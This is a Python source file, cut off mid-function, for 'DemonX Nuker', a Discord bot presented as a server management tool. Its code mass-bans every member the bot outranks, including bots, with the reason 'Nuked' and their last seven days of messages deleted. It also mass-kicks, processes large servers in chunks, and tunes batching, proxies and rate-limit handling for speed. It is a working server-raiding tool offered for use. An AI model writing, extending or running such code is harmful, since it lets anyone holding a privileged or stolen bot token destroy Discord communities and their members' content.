"""
DemonX Nuker - Complete Professional Edition
Author: Kirito / Demon
Full-featured Discord server management tool with all operations and advanced features
"""

import asyncio
import json
import random
import string
import time
import logging
import os
import threading
import signal
import sys
import re
import unicodedata
from typing import Optional, List, Dict, Any, Coroutine, Union, Callable
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from dataclasses import asdict
import aiohttp

import discord
from discord.ext import commands
from colorama import init, Fore, Style

# Import from modular package
from demonx import (
    Config,
    OperationType,
    OperationRecord,
    RateLimiter,
    ProxyManager,
    OperationHistory,
    PresetManager,
    get_user_friendly_error,
    load_config,
    print_banner,
    ERROR_MESSAGES
)

# Import operation queue (optional feature)
try:
    from demonx.operation_queue import OperationQueue, QueuePriority
    QUEUE_AVAILABLE = True
except ImportError:
    QUEUE_AVAILABLE = False
    OperationQueue = None
    QueuePriority = None

init(autoreset=True)

# Configure logging with rotation support
from logging.handlers import RotatingFileHandler

# Enhanced logging configuration (using Config class)
log_format = Config.LOG_FORMAT
log_file = Config.LOG_FILE
max_bytes = Config.LOG_MAX_BYTES
backup_count = Config.LOG_BACKUP_COUNT
log_level = getattr(logging, Config.LOG_LEVEL.upper(), logging.INFO)

# Create rotating file handler
file_handler = RotatingFileHandler(
    log_file,
    maxBytes=max_bytes,
    backupCount=backup_count,
    encoding='utf-8'
)
file_handler.setLevel(log_level)
file_handler.setFormatter(logging.Formatter(log_format))

# Console handler
console_handler = logging.StreamHandler()
console_handler.setLevel(log_level)
console_handler.setFormatter(logging.Formatter(log_format))

# Configure root logger
logging.basicConfig(
    level=log_level,
    format=log_format,
    handlers=[file_handler, console_handler]
)
logger = logging.getLogger('DemonX')

# All classes (Config, OperationType, OperationRecord, RateLimiter, ProxyManager,
# OperationHistory, PresetManager) and utility functions (get_user_friendly_error,
# load_config, print_banner, ERROR_MESSAGES) are now imported from demonx package

class DemonXComplete:
    """Complete DemonX Nuker with all features
    
    Security Note:
    - Bot tokens are stored in memory and should be kept secure
    - Tokens are cleared from memory after bot initialization
    - Never log or expose tokens in error messages or debug output
    """
    
    # Use __slots__ to prevent accidental attribute access and reduce memory usage
    __slots__ = (
        '_token',  # Private token storage
        'use_proxy', 'dry_run', 'verbose', 'rate_limiter', 'operation_history',
        'preset_manager', 'proxy_manager', 'stats', 'bot', '_stats_lock',
        'stats_file', '_cancellation_token',  # Statistics and cancellation
        'operation_metrics', 'rate_limit_hits', '_metrics_lock',  # Metrics
        '_batch_size_adjustments', '_last_rate_limit_info',  # Dynamic batch sizing
        'operation_queue', '_config_last_modified', '_config_watch_enabled'  # Queue and config reload
    )
    
    def __init__(self, token: str, use_proxy: bool = False, dry_run: bool = False, verbose: bool = True):
        # Store token privately to prevent accidental access
        self._token = token
        self.use_proxy = use_proxy
        self.dry_run = dry_run
        self.verbose = verbose  # Control print output
        self.rate_limiter = RateLimiter()
        self.operation_history = OperationHistory()
        self.preset_manager = PresetManager()
        self.proxy_manager = ProxyManager() if use_proxy else None
        # proxy_url removed - Rust/Twilight proxy manager handles all proxy operations
        
        # Statistics with thread-safe lock
        self._stats_lock = threading.Lock()
        self.stats = defaultdict(int)
        self.stats['start_time'] = time.time()
        self.stats_file = "statistics.json"
        self._cancellation_token = asyncio.Event()  # Operation cancellation token
        
        # Operation metrics tracking
        self.operation_metrics = defaultdict(list)  # Track timing per operation type
        self.rate_limit_hits = defaultdict(int)  # Track rate limit hits per endpoint
        self._metrics_lock = threading.Lock()  # Lock for metrics updates
        
        # Dynamic batch sizing tracking
        self._batch_size_adjustments = defaultdict(float)  # Track batch size multipliers per operation
        self._last_rate_limit_info = {}  # Store last rate limit info per endpoint
        
        # Initialize operation queue if available (don't start processing yet - need guild first)
        self.operation_queue = None
        if QUEUE_AVAILABLE and OperationQueue:
            try:
                self.operation_queue = OperationQueue()
                # Set handler for queue operations
                self.operation_queue.set_handler(self._execute_queued_operation)
                # start_processing will be called in on_ready when guild is available
            except Exception as e:
                logger.warning(f"Failed to initialize operation queue: {e}")
                self.operation_queue = None
        
        # Config watcher state
        self._config_last_modified = 0
        self._config_watch_enabled = False
        
        self._load_statistics()
        
        # Proxy configuration - only use Rust/Twilight proxy manager
        # Manual proxy methods (environment variables, HTTP client patching) removed
        # Rust proxy manager handles all proxy operations when available
        if use_proxy and self.proxy_manager:
            if hasattr(self.proxy_manager, '_use_rust') and self.proxy_manager._use_rust:
                logger.info("Using Rust/Twilight proxy manager for all proxy operations")
            elif self.proxy_manager.proxies:
                logger.warning("Python proxy manager fallback - Rust proxy manager not available")
        
        # Bot setup - enable members intent (REQUIRED for ban/kick operations)
        # Members intent is needed to access guild.members list
        intents = discord.Intents.default()
        # CRITICAL: Members intent MUST be enabled for ban/kick operations
        # This must be enabled in code AND in Discord Developer Portal
        intents.members = True  # PRIVILEGED - Server Members Intent (REQUIRED)
        intents.presences = False  # PRIVILEGED - Presence Intent (not needed)
        intents.message_content = False  # PRIVILEGED - Message Content Intent (not needed)
        
        # Create connector with connection pooling for better performance
        # Always use connection pooling, even without proxy (using Config class)
        connector = aiohttp.TCPConnector(
            limit=Config.CONNECTOR_LIMIT,
            limit_per_host=Config.CONNECTOR_LIMIT_PER_HOST,
            ttl_dns_cache=Config.CONNECTOR_TTL_DNS_CACHE,
            force_close=Config.CONNECTOR_FORCE_CLOSE,
            enable_cleanup_closed=Config.CONNECTOR_ENABLE_CLEANUP_CLOSED
        )
        
        self.bot = commands.Bot(
            command_prefix='!',
            intents=intents,
            help_command=None,
            case_insensitive=True,
            connector=connector
        )
        
        # Proxy handling is managed by Rust/Twilight proxy manager only
        # Manual HTTP client patching removed - Rust handles all proxy operations
        
        self.setup_events()
    
    def setup_events(self) -> None:
        """Setup bot events"""
        # on_ready will be set in main() to access guild_id
        pass
    
    def _print(self, message: str, color: str = Fore.WHITE, force: bool = False):
        """Conditional print based on verbose flag
        
        Args:
            message: Message to print
            color: Colorama color code
            force: If True, always print regardless of verbose flag
        """
        if self.verbose or force:
            print(f"{color}{message}{Style.RESET_ALL}")
    
    @staticmethod
    def validate_token(token: str) -> str:
        """Validate Discord bot token format
        
        Args:
            token: Bot token string to validate
        
        Returns:
            Validated token string
        
        Raises:
            ValueError: If token is invalid
        """
        token = token.strip()
        if not token:
            raise ValueError("Token cannot be empty")
        if len(token) < 50:
            raise ValueError("Token appears to be too short (minimum 50 characters)")
        if token.count('.') != 2:
            raise ValueError("Token format appears invalid (expected format: XXXX.XXXX.XXXX)")
        return token
    
    @staticmethod
    def validate_count(count: int, min_value: int = 1, max_value: int = 1000, param_name: str = "count") -> int:
        """Validate count parameter
        
        Args:
            count: Count value to validate
            min_value: Minimum allowed value (default: 1)
            max_value: Maximum allowed value (default: 1000)
            param_name: Parameter name for error messages (default: "count")
        
        Returns:
            Validated count value
        
        Raises:
            ValueError: If count is outside valid range
        """
        if count < min_value:
            raise ValueError(f"{param_name} must be at least {min_value}")
        if count > max_value:
            raise ValueError(f"{param_name} must be at most {max_value}")
        return count
    
    @staticmethod
    def validate_message_length(message: str, max_length: int = 2000) -> str:
        """Validate message length for Discord limits
        
        Args:
            message: Message to validate
            max_length: Maximum allowed length (default: 2000, Discord limit)
        
        Returns:
            Validated message string
        
        Raises:
            ValueError: If message exceeds maximum length
        """
        if len(message) > max_length:
            raise ValueError(f"Message length ({len(message)}) exceeds maximum ({max_length} characters)")
        return message
    
    @staticmethod
    def validate_channel_name(name: str) -> str:
        """Validate and sanitize channel name for Discord limits
        
        Args:
            name: Channel name to validate
        
        Returns:
            Validated and sanitized channel name (truncated if needed)
        """
        if not name:
            return ""
        
        # Remove null bytes and control characters
        name = ''.join(char for char in name if ord(char) >= 32 or char in '\n\r\t')
        
        # Remove leading/trailing whitespace
        name = name.strip()
        
        # Discord channel name limit is 100 characters
        if len(name) > 100:
            name = name[:100]
        
        # Ensure name is not empty after sanitization
        if not name:
            return ""
        
        # Validate against Discord's allowed characters (alphanumeric, underscore, hyphen)
        # Note: Discord allows more characters, but we'll be conservative
        name = re.sub(r'[^\w\s\-]', '', name)
        
        return name
    
    @staticmethod
    def validate_message_content(message: str) -> str:
        """Validate and sanitize message content for Discord limits
        
        Args:
            message: Message content to validate
        
        Returns:
            Validated and sanitized message content (truncated if needed)
        """
        if not message:
            return ""
        
        # Remove null bytes
        message = message.replace('\x00', '')
        
        # Discord message limit is 2000 characters
        if len(message) > 2000:
            message = message[:2000]
        
        # Normalize Unicode (NFKC normalization)
        try:
            message = unicodedata.normalize('NFKC', message)
        except Exception:
            pass  # If normalization fails, continue with original
        
        return message
    
    @staticmethod
    def validate_guild_id(guild_id: str) -> int:
        """Validate and convert guild ID
        
        Args:
            guild_id: Guild ID string to validate
        
        Returns:
            Validated guild ID as integer
        
        Raises:
            ValueError: If guild ID is invalid
        """
        try:
            gid = int(guild_id.strip())
            if gid < 1:
                raise ValueError("Guild ID must be positive")
            if gid < 100000000000000000:  # Discord snowflake minimum
                raise ValueError("Guild ID appears to be too small (invalid Discord ID)")
            return gid
        except ValueError as e:
            if "invalid literal" in str(e).lower():
                raise ValueError(f"Invalid guild ID format: {guild_id}") from e
            raise
    
    async def safe_operation(self, operation_name: str, coro: Coroutine) -> Any:
        """Standardized safe operation wrapper for consistent error handling
        
        Args:
            operation_name: Name of the operation for logging
            coro: Coroutine to execute
        
        Returns:
            Result of the coroutine
        
        Raises:
            discord.HTTPException: For Discord API errors
            Exception: For other errors
        """
        try:
            return await coro
        except discord.HTTPException as e:
            logger.error(f"{operation_name} failed: HTTP {e.status} - {e}")
            raise
        except Exception as e:
            logger.error(f"{operation_name} failed: {e}", exc_info=True)
            raise
    
    def _parse_rate_limit_headers(self, headers: Any) -> Dict[str, Any]:
        """Parse rate limit headers with robust validation
        
        Args:
            headers: HTTP response headers (from discord.py response)
        
        Returns:
            Dictionary with rate limit information containing:
            - remaining: Number of requests remaining
            - limit: Total request limit
            - reset_after: Seconds until rate limit resets
            - retry_after: Seconds to wait before retrying
            - is_global: Whether this is a global rate limit
        
        Note:
            Returns safe defaults if parsing fails (logs warning)
        """
        try:
            remaining = int(headers.get('X-RateLimit-Remaining', '50'))
            limit = int(headers.get('X-RateLimit-Limit', '50'))
            reset_after = float(headers.get('X-RateLimit-Reset-After', '1.0'))
            retry_after = float(headers.get('Retry-After', '1.0'))
            is_global = headers.get('X-RateLimit-Global', 'false').lower() == 'true'
            
            return {
                'remaining': max(0, remaining),
                'limit': max(1, limit),
                'reset_after': max(0.0, reset_after),
                'retry_after': max(0.0, retry_after),
                'is_global': is_global
            }
        except (ValueError, TypeError) as e:
            logger.warning(f"Failed to parse rate limit headers: {e}")
            return {
                'remaining': 50,
                'limit': 50,
                'reset_after': 1.0,
                'retry_after': 1.0,
                'is_global': False
            }
    
    def cancel_operations(self) -> None:
        """Cancel all ongoing operations"""
        self._cancellation_token.set()
        logger.info("Operations cancellation requested")
    
    def reset_cancellation(self) -> None:
        """Reset cancellation token (call before starting new operations)"""
        self._cancellation_token.clear()
    
    async def safe_execute(self, coro: Coroutine, retries: Optional[int] = None, endpoint: str = "global", operation_type: Optional[OperationType] = None, timeout: Optional[float] = None, retry_strategy: Optional[str] = None) -> Union[Any, bool]:
        """Safely execute with error handling and timeout (optimized for maximum speed)
        
        Args:
            coro: Coroutine to execute
            retries: Number of retry attempts (defaults to Config.MAX_RETRIES)
            endpoint: API endpoint for rate limiting
            operation_type: Type of operation for history tracking
            timeout: Operation timeout in seconds (defaults to Config.DEFAULT_OPERATION_TIMEOUT)
            retry_strategy: Retry strategy ("exponential", "linear", "fixed")
        
        Returns:
            Result of coroutine or False if all retries failed
        
        Raises:
            asyncio.TimeoutError: If operation times out
            discord.HTTPException: For Discord API errors (after retries exhausted)
            Exception: For other errors (after retries exhausted)
        
        Example:
            >>> result = await nuker.safe_execute(
            ...     guild.create_text_channel("test"),
            ...     endpoint="guilds/123/channels",
            ...     operation_type=OperationType.CREATE_CHANNEL
            ... )
        """
        retries = retries or Config.MAX_RETRIES
        timeout = timeout or Config.DEFAULT_OPERATION_TIMEOUT
        await self.rate_limiter.wait_for_rate_limit(endpoint)
        
        # Track operation start time for metrics
        operation_start = time.time()
        
        if self.dry_run:
            logger.info(f"[DRY RUN] Would execute: {operation_type}")
            return True
        
        retry_strategy = retry_strategy or Config.RETRY_STRATEGY
        last_error = None
        for attempt in range(retries):
            # Check for cancellation
            if self._cancellation_token.is_set():
                logger.warning(f"Operation {operation_type} cancelled by user")
                return False
            
            try:
                # Apply timeout to prevent hanging operations
                result = await asyncio.wait_for(coro, timeout=timeout)
                
                # Track operation metrics
                operation_duration = time.time() - operation_start
                if operation_type:
                    # Defer history addition to reduce blocking
                    self.operation_history.add_operation(operation_type, True, {})
                    # Track timing metrics
                    with self._metrics_lock:
                        self.operation_metrics[operation_type.value].append(operation_duration)
                        # Keep only last 1000 timings per operation type
                        if len(self.operation_metrics[operation_type.value]) > 1000:
                            self.operation_metrics[operation_type.value] = self.operation_metrics[operation_type.value][-1000:]
                
                return result
            except asyncio.TimeoutError:
                timeout_error = f"Operation {operation_type} timed out after {timeout}s"
                logger.error(timeout_error)
                last_error = TimeoutError(timeout_error)
                if attempt < retries - 1:
                    # Linear backoff for timeouts (more predictable)
                    delay = self._calculate_retry_delay(attempt, "linear")
                    await asyncio.sleep(delay)
                    continue
            except discord.HTTPException as e:
                last_error = e
                if e.status == 429:
                    # Rate limit - use exponential backoff with exact retry_after
                    rate_limit_info = self._parse_rate_limit_headers(e.response.headers)
                    self.rate_limiter.handle_rate_limit(
                        endpoint,
                        rate_limit_info['retry_after'],
                        rate_limit_info['is_global']
                    )
                    # Track rate limit hits
                    with self._metrics_lock:
                        self.rate_limit_hits[endpoint] += 1
                    # Use exact retry_after without extra delay when possible
                    await asyncio.sleep(max(Config.DELAY_MINIMAL, rate_limit_info['retry_after']))
                    continue
                elif e.status in [403, 404]:
                    # Non-retryable errors - don't retry
                    logger.warning(f"Non-retryable error {e.status}: {e}")
                    break
                elif e.status in [500, 502, 503, 504]:
                    # Server errors - exponential backoff
                    if attempt < retries - 1:
                        delay = self._calculate_retry_delay(attempt, "exponential")
                        await asyncio.sleep(delay)
                        continue
                elif e.status in [408, 408]:
                    # Request timeout - linear backoff
                    if attempt < retries - 1:
                        delay = self._calculate_retry_delay(attempt, "linear")
                        await asyncio.sleep(delay)
                        continue
                elif attempt < retries - 1:
                    # Other HTTP errors - use configured strategy
                    delay = self._calculate_retry_delay(attempt, retry_strategy)
                    await asyncio.sleep(delay)
                    continue
            except (ConnectionError, OSError) as e:
                # Network errors - exponential backoff with immediate retry first
                last_error = e
                if attempt < retries - 1:
                    if attempt == 0:
                        # Immediate retry for transient network errors
                        delay = Config.DELAY_MINIMAL
                    else:
                        delay = self._calculate_retry_delay(attempt, "exponential")
                    await asyncio.sleep(delay)
                    continue
            except Exception as e:
                last_error = e
                if attempt < retries - 1:
                    # Generic errors - use configured strategy
                    delay = self._calculate_retry_delay(attempt, retry_strategy)
                    await asyncio.sleep(delay)
                    continue
        
        # All retries failed
        if operation_type and last_error:
            error_str = str(last_error)
            self.operation_history.add_operation(operation_type, False, {}, error_str)
            self._increment_stat('errors')
        if last_error:
            logger.error(f"Error in safe_execute after {retries} attempts: {last_error}")
        return False
    
    def _increment_stat(self, key: str, value: int = 1):
        """Thread-safe stat increment
        
        Args:
            key: Statistics key to increment
            value: Value to add (default: 1)
        """
        with self._stats_lock:
            self.stats[key] += value
            # Increment counter first, then check (atomic operation)
            self.stats['_save_counter'] = self.stats.get('_save_counter', 0) + 1
            # Periodic save (every 10 increments to reduce I/O)
            # Check after increment to ensure atomic operation
            if self.stats['_save_counter'] % 10 == 0:
                self._save_statistics()
    
    def _load_statistics(self) -> None:
        """Load persisted statistics from file with file locking"""
        try:
            if Path(self.stats_file).exists():
                with open(self.stats_file, 'r', encoding='utf-8') as f:
                    try:
                        loaded_stats = json.load(f)
                        # Merge with existing stats (preserve start_time)
                        start_time = self.stats.get('start_time', time.time())
                        self.stats.update(loaded_stats)
                        self.stats['start_time'] = start_time
                    except json.JSONDecodeError:
                        logger.warning(f"Invalid JSON in {self.stats_file}, starting fresh")
        except Exception as e:
            logger.error(f"Error loading statistics: {e}")
    
    def _save_statistics(self) -> None:
        """Save statistics to file with atomic write and backup"""
        try:
            # Create backup of existing file if it exists
            if Path(self.stats_file).exists():
                backup_file = f"{self.stats_file}.backup"
                try:
                    import shutil
                    shutil.copy2(self.stats_file, backup_file)
                    # Keep only one backup (remove old backup if exists)
                    old_backup = f"{self.stats_file}.backup.old"
                    if Path(old_backup).exists():
                        Path(old_backup).unlink()
                except Exception as backup_error:
                    logger.warning(f"Could not create statistics backup: {backup_error}")
            
            # Atomic write: write to temp file, then rename
            temp_file = f"{self.stats_file}.tmp"
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(dict(self.stats), f, indent=2)
                f.flush()
                if hasattr(os, 'fsync'):
                    os.fsync(f.fileno())  # Force write to disk
            
            # Atomic rename (works on Unix and Windows)
            if os.name == 'nt':
                # Windows: replace existing file
                if Path(self.stats_file).exists():
                    Path(self.stats_file).unlink()
                Path(temp_file).rename(self.stats_file)
            else:
                # Unix: atomic rename
                Path(temp_file).rename(self.stats_file)
        except Exception as e:
            logger.error(f"Error saving statistics: {e}")
            # Clean up temp file on error
            try:
                if Path(temp_file).exists():
                    Path(temp_file).unlink()
            except:
                pass
    
    async def _batch_process(self, tasks: List[Coroutine], batch_size: int, delay: float, operation_name: str) -> List[Any]:
        """Process tasks in batches with error tracking, progress reporting, and cancellation support
        
        Args:
            tasks: List of coroutines to execute
            batch_size: Number of tasks per batch
            delay: Delay between batches in seconds
            operation_name: Name of operation for logging
        
        Returns:
            List of results (exceptions are logged but not returned)
        """
        if not tasks:
            return []
        
        results = []
        total = len(tasks)
        completed = 0
        errors = 0
        active_tasks: List[asyncio.Task] = []
        # Use set for O(1) removal of completed tasks
        completed_task_ids: set = set()
        
        try:
            for i in range(0, total, batch_size):
                # Check for cancellation before processing batch
                if self._cancellation_token.is_set():
                    logger.info(f"{operation_name}: Operation cancelled, cleaning up {len(active_tasks)} active tasks")
                    # Cancel all active tasks
                    for task in active_tasks:
                        if not task.done():
                            task.cancel()
                    # Wait for cancellation to complete
                    if active_tasks:
                        await asyncio.gather(*active_tasks, return_exceptions=True)
                    break
                
                # Clean up completed tasks periodically to prevent memory accumulation
                if len(active_tasks) > batch_size * 2:
                    active_tasks = [t for t in active_tasks if not t.done() or id(t) not in completed_task_ids]
                    completed_task_ids.clear()
                
                batch = tasks[i:i + batch_size]
                # Create tasks for better tracking and cancellation support
                batch_tasks = [asyncio.create_task(coro) for coro in batch]
                active_tasks.extend(batch_tasks)
                
                try:
                    batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
                    
                    # Track failures and successes
                    for result in batch_results:
                        if isinstance(result, asyncio.CancelledError):
                            logger.info(f"{operation_name}: Task cancelled")
                            errors += 1
                        elif isinstance(result, Exception):
                            logger.error(f"Batch operation failed in {operation_name}: {result}")
                            errors += 1
                            self._increment_stat('errors')
                        else:
                            results.append(result)
                            completed += 1
                except asyncio.CancelledError:
                    logger.info(f"{operation_name}: Batch cancelled")
                    # Cancel remaining tasks in batch
                    for task in batch_tasks:
                        if not task.done():
                            task.cancel()
                    break
                
                # Remove completed tasks from active list (prevent memory accumulation)
                # Track completed task IDs for efficient cleanup
                for task in batch_tasks:
                    if task.done():
                        completed_task_ids.add(id(task))
                
                # Clean up completed tasks periodically
                active_tasks = [t for t in active_tasks if not (t.done() and id(t) in completed_task_ids)]
                
                # Progress reporting (if verbose) with graceful degradation info
                if self.verbose and total > batch_size:
                    progress = (completed / total) * 100
                    success_rate = (completed / (completed + errors) * 100) if (completed + errors) > 0 else 0
                    print(f"\r[{operation_name}] Progress: {completed}/{total} ({progress:.1f}%) - Success: {success_rate:.1f}% - Errors: {errors}", 
                          end='', flush=True)
                
                # Graceful degradation: Continue processing even with errors
                # Only stop if cancellation is requested or all tasks failed
                if errors > 0 and completed == 0 and i > 0:
                    # If we've processed batches but all failed, warn but continue
                    logger.warning(f"{operation_name}: High failure rate detected, but continuing...")
                
                # Delay between batches (except for last batch)
                if i + batch_size < total and not self._cancellation_token.is_set():
                    await asyncio.sleep(delay)
        finally:
            # Cleanup: cancel any remaining active tasks
            if active_tasks:
                logger.debug(f"{operation_name}: Cleaning up {len(active_tasks)} remaining tasks")
                for task in active_tasks:
                    if not task.done():
                        task.cancel()
                # Wait for cancellation to complete (with timeout)
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*active_tasks, return_exceptions=True),
                        timeout=5.0
                    )
                except asyncio.TimeoutError:
                    logger.warning(f"{operation_name}: Some tasks did not cancel within timeout")
        
        # New line after progress if verbose
        if self.verbose and total > batch_size:
            print()  # New line after progress
        
        if errors > 0:
            logger.warning(f"{operation_name}: {errors} errors out of {total} operations")
        
        return results
    
    def _calculate_retry_delay(self, attempt: int, strategy: str) -> float:
        """Calculate retry delay based on strategy
        
        Args:
            attempt: Current attempt number (0-indexed)
            strategy: Retry strategy ("exponential", "linear", "fixed")
        
        Returns:
            Delay in seconds
        """
        if strategy == "exponential":
            return min(Config.RETRY_BASE_DELAY * (2 ** attempt), Config.MAX_BACKOFF)
        elif strategy == "linear":
            return Config.RETRY_BASE_DELAY * (attempt + 1)
        else:  # fixed
            return Config.RETRY_BASE_DELAY
    
    async def _process_large_guild_operation(self, guild: discord.Guild, operation: str, *args: Any, **kwargs: Any) -> None:
        """Process operations for very large guilds (5000+ members) in chunks
        
        Fetches and processes members in chunks to avoid memory exhaustion.
        This is essential for very large Discord servers with 10,000+ members.
        
        Args:
            guild: The Discord guild
            operation: Operation name ('ban', 'kick', etc.)
            *args: Additional arguments for the operation
            **kwargs: Additional keyword arguments
        """
        logger.info(f"Processing large guild operation: {operation} for guild {guild.id} ({guild.member_count} members)")
        print(f"{Fore.YELLOW}[*] Large guild detected ({guild.member_count} members), processing in chunks...{Style.RESET_ALL}")
        
        chunk_size = Config.LARGE_GUILD_CHUNK_SIZE
        bot_id = self.bot.user.id
        bot_top_role = guild.me.top_role
        total_processed = 0
        
        try:
            # Fetch members in chunks using guild.chunk() or manual fetching
            # For very large guilds, we need to fetch members in batches
            async for chunk in self._fetch_members_in_chunks(guild, chunk_size):
                # Filter members in this chunk
                # Filter members - include bot members, exclude only bot itself
                # Use <= to include members with same or lower role (not just <)
                members_to_process = [
                    m for m in chunk
                    if m.id != bot_id and m.top_role <= bot_top_role
                ]
                
                if not members_to_process:
                    continue
                
                # Process this chunk based on operation type
                if operation == "ban":
                    reason = args[0] if args else "Nuked"
                    await self._process_ban_chunk(guild, members_to_process, reason)
                elif operation == "kick":
                    reason = args[0] if args else "Nuked"
                    await self._process_kick_chunk(guild, members_to_process, reason)
                else:
                    logger.warning(f"Unknown operation type for large guild: {operation}")
                    return
                
                total_processed += len(members_to_process)
                print(f"{Fore.CYAN}[*] Processed {total_processed}/{guild.member_count} members...{Style.RESET_ALL}")
                
                # Small delay between chunks to avoid rate limits
                await asyncio.sleep(Config.DELAY_MEDIUM)
            
            print(f"{Fore.GREEN}[+] Completed processing {total_processed} members{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"Error in large guild operation: {e}", exc_info=True)
            print(f"{Fore.RED}[!] Error processing large guild: {e}{Style.RESET_ALL}")
    
    async def _fetch_members_in_chunks(self, guild: discord.Guild, chunk_size: int):
        """Fetch guild members in chunks to avoid memory issues
        
        Args:
            guild: The Discord guild
            chunk_size: Number of members per chunk
        
        Yields:
            Lists of members in chunks
        """
        # Use guild.chunk() if available, otherwise fetch manually
        try:
            # Try to use guild.chunk() which is more efficient
            await guild.chunk()
            # After chunking, process in batches
            all_members = list(guild.members)
            for i in range(0, len(all_members), chunk_size):
                yield all_members[i:i + chunk_size]
        except Exception as e:
            logger.warning(f"Could not use guild.chunk(), falling back to manual fetching: {e}")
            # Fallback: fetch members manually (this is slower but works)
            # Note: Discord.py doesn't have a direct way to fetch members in chunks
            # So we'll process the members we have in chunks
            all_members = list(guild.members)
            for i in range(0, len(all_members), chunk_size):
                yield all_members[i:i + chunk_size]
    
    async def _process_ban_chunk(self, guild: discord.Guild, members: List[discord.Member], reason: str) -> None:
        """Process a chunk of members for banning
        
        Args:
            guild: The Discord guild
            members: List of members to ban
            reason: Ban reason
        """
        endpoint = f"guilds/{guild.id}/bans"
        tasks = []
        for member in members:
            async def ban_member(m):
                result = await self.safe_execute(
                    guild.ban(m, reason=reason, delete_message_days=7),
                    endpoint=endpoint,
                    operation_type=OperationType.BAN
                )
                if result is not False:
                    self._increment_stat('banned')
            
            tasks.append(ban_member(member))
        
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_BAN_KICK, delay=Config.DELAY_DEFAULT, operation_name="ban_chunk")
    
    async def _process_kick_chunk(self, guild: discord.Guild, members: List[discord.Member], reason: str) -> None:
        """Process a chunk of members for kicking
        
        Args:
            guild: The Discord guild
            members: List of members to kick
            reason: Kick reason
        """
        endpoint = f"guilds/{guild.id}/members"
        tasks = []
        for member in members:
            async def kick_member(m):
                result = await self.safe_execute(
                    guild.kick(m, reason=reason),
                    endpoint=f"{endpoint}/{m.id}",
                    operation_type=OperationType.KICK
                )
                if result is not False:
                    self._increment_stat('kicked')
            
            tasks.append(kick_member(member))
        
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_BAN_KICK, delay=Config.DELAY_DEFAULT, operation_name="kick_chunk")
    
    # ==================== MEMBER MANAGEMENT ====================
    
    async def ban_all_members(self, guild: discord.Guild, reason: str = "Nuked", progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Ban all members from a guild (optimized for maximum speed)
        
        Bans all members from the specified guild, excluding the bot itself and members
        with higher roles. For large guilds (5000+ members), uses chunked processing
        to avoid memory issues.
        
        Args:
            guild: The Discord guild to ban members from
            reason: Reason for the ban (default: "Nuked")
            progress_callback: Optional callback function(current, total) for progress updates
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks ban permissions
            discord.HTTPException: If API request fails
        
        Example:
            ```python
            async def progress(current, total):
                print(f"Banned {current}/{total} members")
            
            await nuker.ban_all_members(guild, reason="Spam", progress_callback=progress)
            ```
        
        Performance:
            - Batch size: 30 members per batch
            - Delay: 0.05s between batches
            - For large guilds: Processes in chunks of 1000 members
        """
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Ban Operation...{Fore.CYAN}{' ' * 37}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        # Memory management for large guilds (5000+ members)
        if guild.member_count > 5000:
            logger.info(f"Large guild detected ({guild.member_count} members), using chunked processing")
            await self._process_large_guild_operation(guild, "ban", reason)
            return
        
        # Use cached members immediately - chunking is slow and not necessary
        # Discord automatically caches members when members intent is enabled
        members_cached = len(guild.members)
        print(f"{Fore.CYAN}[*] Using cached members: {members_cached} members{Style.RESET_ALL}")
        
        # Only try to fetch more members if we have very few cached (just bot itself)
        # Use a very short timeout (5 seconds) to avoid blocking
        if members_cached <= 1:
            print(f"{Fore.CYAN}[*] Attempting to fetch members (5 second timeout)...{Style.RESET_ALL}")
            try:
                await asyncio.wait_for(guild.chunk(), timeout=5.0)
                members_after = len(guild.members)
                if members_after > members_cached:
                    print(f"{Fore.GREEN}[+] Fetched {members_after} members{Style.RESET_ALL}\n")
                else:
                    print(f"{Fore.YELLOW}[*] No additional members fetched, using cached: {members_after}{Style.RESET_ALL}\n")
            except (asyncio.TimeoutError, Exception) as e:
                print(f"{Fore.YELLOW}[*] Using cached members: {len(guild.members)} members{Style.RESET_ALL}")
                if members_cached <= 1:
                    print(f"{Fore.YELLOW}[!] Make sure 'Server Members Intent' is enabled in Discord Developer Portal{Style.RESET_ALL}\n")
                else:
                    print()  # Just newline
                logger.warning(f"Could not fetch additional members: {e}. Using cached members.")
        else:
            print()  # Just newline for spacing
        
        # Filter members - ban all members including bots, but exclude:
        # 1. The bot itself (the one running the script)
        # 2. Members with higher roles than the bot (use <= to include same role level)
        bot_id = self.bot.user.id
        bot_top_role = guild.me.top_role
        # Ban all members (including bots) except the bot itself
        # Allow banning members with same or lower role (use <= instead of <)
        members_to_ban = [
            m for m in guild.members 
            if m.id != bot_id and m.top_role <= bot_top_role
            # Note: Bot members (m.bot == True) are included in the ban list
        ]
        
        if not members_to_ban:
            print(f"{Fore.YELLOW}[*] No members to ban{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total members in cache: {len(guild.members)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Bot ID: {bot_id}{Style.RESET_ALL}")
            if len(guild.members) == 1:
                print(f"{Fore.YELLOW}[*] Only bot itself is in the member cache. Make sure members intent is enabled in Discord Developer Portal.{Style.RESET_ALL}\n")
            else:
                print(f"{Fore.YELLOW}[*] All members may have higher roles than the bot.{Style.RESET_ALL}\n")
            return
        
        endpoint = f"guilds/{guild.id}/bans"
        # Create tasks efficiently
        tasks = []
        for member in members_to_ban:
            async def ban_member(m):
                result = await self.safe_execute(
                    guild.ban(m, reason=reason, delete_message_days=7),
                    endpoint=endpoint,
                    operation_type=OperationType.BAN
                )
                if result is not False:
                    self._increment_stat('banned')
            
            tasks.append(ban_member(member))
        
        # Use generic batch processor with progress callback support
        total_members = len(members_to_ban)
        if progress_callback:
            # Wrap batch processor to call progress callback
            original_batch_process = self._batch_process
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
